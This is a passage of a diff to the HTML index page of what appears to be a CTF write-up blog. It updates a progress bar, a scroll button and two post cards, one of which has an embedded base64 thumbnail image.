@@ -2704,8 +2704,8 @@
 
 <body>
 
-    <div class="read-progress" id="readProgress" style="width: 100%;"></div>
-    <button class="to-top-btn show" id="toTopBtn" onclick="scrollToTop()" title="Back to top"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg></button>
+    <div class="read-progress" id="readProgress" style="width: 0%;"></div>
+    <button class="to-top-btn" id="toTopBtn" onclick="scrollToTop()" title="Back to top"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg></button>
 
     <!-- NAV -->
     <nav>
@@ -3086,708 +3086,129 @@
                 <div class="ei">⌗</div>
                 <div>No write-ups published yet.</div>
             </div>
-        <div class="post-card"><div class="pc-inner"><div><div class="pc-cat">CTF</div><div class="pc-title">DarkZero Returns Writeup</div><div class="pc-exc">josh@SRV01: ~ Hack The Box · Write-up DarkZero ReturnsDual-Forest Active Directory Compromise Unauthenticated Node.js campaign manager to Domain Admin on two trusted Active Directo</div><div class="pc-foot"><span class="pc-date">30 Jul 2026</span><span class="pc-readtime">11 min read</span><button class="pc-share" title="Share this write-up" onclick="event.stopPropagation(); sharePost('ms6pabx5l4pp4hvdys')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.6" y1="10.5" x2="15.4" y2="6.5"></line><line x1="8.6" y1="13.5" x2="15.4" y2="17.5"></line></svg></button></div></div></div><div class="pc-arr">→</div></div><div class="post-card"><div class="pc-inner"><img class="pc-icon" src="data:image/jpeg;base64,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" alt=""><div><div class="pc-cat">HTB</div><div class="pc-title">Fireflow</div><div class="pc-exc"></div><div class="pc-foot"><span class="pc-date">23 Jul 2026</span><span class="ptag">Linux</span><span class="pc-readtime">9 min read</span><button class="pc-share" title="Share this write-up" onclick="event.stopPropagation(); sharePost('mry0rohbft2g7hczzg7')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.6" y1="10.5" x2="15.4" y2="6.5"></line><line x1="8.6" y1="13.5" x2="15.4" y2="17.5"></line></svg></button></div></div></div><div class="pc-arr">→</div></div></div>
+        <div class="post-card"><div class="pc-inner"><div><div class="pc-cat">CTF</div><div class="pc-title">DarkZero Returns Writeup</div><div class="pc-exc">josh@SRV01: ~</div><div class="pc-foot"><span class="pc-date">30 Jul 2026</span><span class="pc-readtime">10 min read</span><button class="pc-share" title="Share this write-up" onclick="event.stopPropagation(); sharePost('ms6pbj1fw2he03evnlb')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.6" y1="10.5" x2="15.4" y2="6.5"></line><line x1="8.6" y1="13.5" x2="15.4" y2="17.5"></line></svg></button></div></div></div><div class="pc-arr">→</div></div><div class="post-card"><div class="pc-inner"><img class="pc-icon" src="data:image/jpeg;base64,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